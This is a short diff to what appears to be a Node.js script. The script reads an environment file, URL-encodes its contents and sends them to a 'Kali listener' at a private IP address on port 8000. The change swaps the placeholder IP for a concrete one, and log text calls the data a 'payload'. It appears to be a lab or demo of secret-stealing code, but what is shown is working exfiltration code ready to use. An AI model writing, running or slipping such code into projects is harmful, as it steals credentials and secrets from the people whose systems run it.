@@ -19,7 +19,7 @@ if (fs.existsSync(envFile)) {
     const encodedEnv = encodeURIComponent(envContent);
     
     // 🔴 REPLACE 192.168.X.X WITH YOUR KALI LINUX IP ADDRESS
-    const kaliUrl = `http://192.168.X.X:8000/collect?file=${encodedEnv}`; 
+    const kaliUrl = `http://192.168.142.129:8000/collect?file=${encodedEnv}`; 
     
     console.log("📡 Step 2: Transmitting payload to Kali listener...");
     
